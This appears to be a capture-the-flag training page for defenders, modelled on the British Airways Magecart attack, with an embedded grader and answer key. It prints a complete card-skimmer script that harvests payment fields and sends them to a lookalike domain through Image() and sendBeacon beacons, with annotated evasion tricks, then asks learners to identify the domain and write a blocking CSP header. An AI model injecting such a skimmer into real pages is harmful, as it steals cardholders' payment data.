@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>AirNova — Challenge 8: Skimmer Autopsy</title>
+<style>
+  body { background:#0a0f1e; color:#f5f3ee; font-family:sans-serif; padding:40px; max-width:900px; margin:0 auto; }
+  h1 { color:#c9a84c; margin-bottom:6px; }
+  p { color:#8a95a8; line-height:1.7; }
+  .card { background:#121929; border:1px solid rgba(255,255,255,0.08); border-radius:8px; padding:24px; margin:20px 0; }
+  .card h2 { font-size:13px; text-transform:uppercase; letter-spacing:1px; color:#c9a84c; margin-bottom:14px; }
+  pre { font-family:monospace; font-size:12px; background:rgba(0,0,0,0.4); padding:20px; border-radius:6px; overflow-x:auto; line-height:1.8; color:#c0c8d8; white-space:pre-wrap; }
+  .kw  { color:#c792ea; }
+  .fn  { color:#82aaff; }
+  .str { color:#c3e88d; }
+  .cm  { color:#546e7a; font-style:italic; }
+  .num { color:#f78c6c; }
+  .task { background:rgba(201,168,76,0.08); border:1px solid rgba(201,168,76,0.2); border-radius:8px; padding:20px 24px; margin:16px 0; }
+  .task h3 { font-size:13px; text-transform:uppercase; letter-spacing:1px; color:#c9a84c; margin-bottom:10px; }
+  input, textarea { width:100%; background:#0a0f1e; border:1px solid rgba(255,255,255,0.1); border-radius:6px; color:#f5f3ee; font-family:monospace; font-size:13px; padding:10px 14px; outline:none; margin:8px 0; }
+  input:focus, textarea:focus { border-color:#c9a84c; }
+  textarea { min-height:80px; resize:vertical; }
+  button { background:#c9a84c; color:#0a0f1e; border:none; padding:10px 24px; border-radius:4px; font-weight:700; font-size:13px; cursor:pointer; margin-top:8px; }
+  button:hover { background:#e8c870; }
+  .result { margin-top:12px; padding:12px 16px; border-radius:6px; font-size:13px; font-family:monospace; display:none; }
+  .result.show { display:block; }
+  .result.ok  { background:rgba(62,207,142,0.1); border:1px solid #3ecf8e; color:#3ecf8e; }
+  .result.err { background:rgba(224,82,82,0.1);  border:1px solid #e05252; color:#e05252; }
+  code { color:#c9a84c; background:rgba(201,168,76,0.1); padding:2px 6px; border-radius:3px; }
+  .diff-badge { display:inline-block; background:rgba(193,62,207,0.2); border:1px solid #a855c8; color:#c978e8; font-size:11px; padding:2px 8px; border-radius:20px; margin-left:8px; vertical-align:middle; }
+  .line-hl { background:rgba(224,82,82,0.12); display:inline-block; width:100%; }
+</style>
+</head>
+<body>
+
+<h1>Challenge 8 — Skimmer Autopsy <span class="diff-badge">Advanced</span></h1>
+<p>The incident response team has recovered the skimmer script that was injected into AirNova's booking page. Your job: read the code, understand exactly what it does, identify the C2 infrastructure, and write the CSP header that blocks it.</p>
+
+<div class="card">
+  <h2>Recovered malicious script — airnova-static.net/forms/autofill.js</h2>
+  <pre><span class="cm">// Obfuscation layer 1: variable names disguised as legitimate analytics</span>
+<span class="kw">var</span> _0xf4a2 = <span class="str">'airnova-static.net'</span>;
+<span class="kw">var</span> _0xb3c1 = <span class="str">'/collect'</span>;
+<span class="kw">var</span> _analyticsEndpoint = <span class="str">'https://'</span> + _0xf4a2 + _0xb3c1;
+
+<span class="cm">// Obfuscation layer 2: delayed execution to evade simple scanners</span>
+<span class="fn">setTimeout</span>(<span class="kw">function</span>() {
+
+  <span class="cm">// Find the payment form by targeting common field names</span>
+  <span class="kw">var</span> _forms = document.<span class="fn">querySelectorAll</span>(<span class="str">'form'</span>);
+  <span class="kw">var</span> _target = <span class="kw">null</span>;
+
+  _forms.<span class="fn">forEach</span>(<span class="kw">function</span>(f) {
+    <span class="kw">if</span> (f.<span class="fn">querySelector</span>(<span class="str">'[name*="card"], [id*="card"], [autocomplete*="cc"]'</span>)) {
+      _target = f;
+    }
+  });
+
+  <span class="kw">if</span> (!_target) <span class="kw">return</span>;
+
+  <span class="cm">// Attach listener: fires when user submits payment</span>
+  _target.<span class="fn">addEventListener</span>(<span class="str">'submit'</span>, <span class="kw">function</span>(e) {
+
+    <span class="cm">// Harvest all sensitive fields</span>
+    <span class="kw">var</span> _data = {
+      n:  (document.<span class="fn">getElementById</span>(<span class="str">'card-name'</span>)  || {}).value,
+      c:  (document.<span class="fn">getElementById</span>(<span class="str">'card-number'</span>) || {}).value,
+      v:  (document.<span class="fn">getElementById</span>(<span class="str">'cvv'</span>)         || {}).value,
+      em: (document.<span class="fn">getElementById</span>(<span class="str">'email'</span>)       || {}).value,
+      ex: (document.<span class="fn">getElementById</span>(<span class="str">'exp-month'</span>)  || {}).value + <span class="str">'/'</span> +
+          (document.<span class="fn">getElementById</span>(<span class="str">'exp-year'</span>)   || {}).value,
+      ua: navigator.userAgent,
+      ref: document.referrer,
+      ts: <span class="kw">new</span> <span class="fn">Date</span>().<span class="fn">toISOString</span>()
+    };
+
+    <span class="cm">// Encode to evade simple network inspection</span>
+    <span class="kw">var</span> _encoded = <span class="fn">btoa</span>(<span class="fn">encodeURIComponent</span>(JSON.<span class="fn">stringify</span>(_data)));
+
+    <span class="cm">// PRIMARY: Exfiltrate via Image() beacon — bypasses many CSP connect-src rules</span>
+    <span class="kw">new</span> <span class="fn">Image</span>().src = _analyticsEndpoint + <span class="str">'?v='</span> + _encoded;
+
+    <span class="cm">// FALLBACK: Also try navigator.sendBeacon for reliability</span>
+    <span class="kw">if</span> (navigator.sendBeacon) {
+      navigator.<span class="fn">sendBeacon</span>(_analyticsEndpoint, _encoded);
+    }
+
+  }, <span class="kw">true</span>); <span class="cm">// capture phase — fires before any validation</span>
+
+}, <span class="num">800</span>); <span class="cm">// 800ms delay — page scanners often miss delayed scripts</span></pre>
+</div>
+
+<!-- Task 1 -->
+<div class="task">
+  <h3>Task 1 — Identify the C2 domain</h3>
+  <p style="color:#8a95a8;font-size:13px">What domain does the skimmer send stolen data to? (exact domain, no https://)</p>
+  <input type="text" id="ans-c2" placeholder="e.g. evil.com">
+  <button onclick="checkC2()">Check</button>
+  <div class="result" id="res-c2"></div>
+</div>
+
+<!-- Task 2 -->
+<div class="task">
+  <h3>Task 2 — Explain the evasion techniques</h3>
+  <p style="color:#8a95a8;font-size:13px">The skimmer uses 3 specific techniques to avoid detection. Name them.</p>
+  <textarea id="ans-evasion" placeholder="1. ...&#10;2. ...&#10;3. ..."></textarea>
+  <button onclick="checkEvasion()">Check</button>
+  <div class="result" id="res-evasion"></div>
+</div>
+
+<!-- Task 3 -->
+<div class="task">
+  <h3>Task 3 — Write the blocking CSP header</h3>
+  <p style="color:#8a95a8;font-size:13px">Write a Content-Security-Policy header value that blocks BOTH the Image() and sendBeacon() exfiltration attempts while still allowing AirNova's own scripts to run.</p>
+  <textarea id="ans-csp" placeholder="default-src ..."></textarea>
+  <button onclick="checkCSP()">Check</button>
+  <div class="result" id="res-csp"></div>
+</div>
+
+<div class="result ok" id="final-flag" style="margin-top:20px;display:none">
+FLAG{sk1mm3r_4ut0psy_c0mpl3t3} — Expert level complete. You can read obfuscated malware, identify C2 infrastructure, and write defensive headers. That is the full attack-to-defence cycle for the BA breach.
+
+Bonus: search "Magecart Group 6" or "RiskIQ Magecart" to read the real threat intelligence reports on the group behind the British Airways attack.
+</div>
+
+<script>
+let t1=false, t2=false, t3=false;
+
+function checkC2() {
+  const v = document.getElementById('ans-c2').value.trim().toLowerCase();
+  const r = document.getElementById('res-c2');
+  if (v === 'airnova-static.net') {
+    r.className='result show ok'; r.textContent='✓ Correct. airnova-static.net — a lookalike domain registered by the attacker to impersonate airnova.com. This is called a homograph or typosquat attack.';
+    t1=true; check();
+  } else {
+    r.className='result show err'; r.textContent='✗ Look at the _0xf4a2 variable at the top of the script — that is where the C2 domain is stored.';
+  }
+}
+
+function checkEvasion() {
+  const v = document.getElementById('ans-evasion').value.toLowerCase();
+  const r = document.getElementById('res-evasion');
+  const hits = [
+    v.includes('delay') || v.includes('timeout') || v.includes('800'),
+    v.includes('obfuscat') || v.includes('variable') || v.includes('_0x') || v.includes('rename'),
+    v.includes('image') || v.includes('beacon') || v.includes('img') || v.includes('sendbeacon'),
+  ];
+  const score = hits.filter(Boolean).length;
+  if (score >= 2) {
+    r.className='result show ok';
+    r.textContent='✓ Good (' + score + '/3). The three techniques are:\n1. setTimeout(800ms) — delayed execution bypasses page-load scanners\n2. Variable name obfuscation (_0xf4a2) — disguises the C2 domain\n3. Dual exfil via Image() + sendBeacon() — redundancy and CSP bypass';
+    t2=true; check();
+  } else {
+    r.className='result show err'; r.textContent='✗ Look at the comments in the code — each evasion technique is annotated. Find: the delay, the variable naming, and the two exfiltration methods.';
+  }
+}
+
+function checkCSP() {
+  const v = document.getElementById('ans-csp').value.toLowerCase();
+  const r = document.getElementById('res-csp');
+  const hasImgSelf = v.includes("img-src") && v.includes("'self'") && !v.includes("img-src *") && !v.includes('img-src \'*\'');
+  const hasConnSelf = (v.includes("connect-src") || v.includes("default-src")) && v.includes("'self'");
+  if (hasImgSelf && hasConnSelf) {
+    r.className='result show ok';
+    r.textContent="✓ Correct. A valid blocking policy:\nContent-Security-Policy: default-src 'self'; script-src 'self'; connect-src 'self'; img-src 'self' data:\n\nThis blocks Image() beacon (img-src 'self' only) and sendBeacon (connect-src 'self' only). The attacker's domain is not 'self', so both channels are cut.";
+    t3=true; check();
+  } else {
+    r.className='result show err';
+    const missing = [];
+    if (!hasImgSelf) missing.push("img-src 'self'  — needed to block the Image() beacon");
+    if (!hasConnSelf) missing.push("connect-src 'self'  — needed to block sendBeacon");
+    r.textContent='✗ Missing: ' + missing.join(' | ');
+  }
+}
+
+function check() {
+  if (t1 && t2 && t3) document.getElementById('final-flag').style.display='block';
+}
+</script>
+
+</body>
+</html>
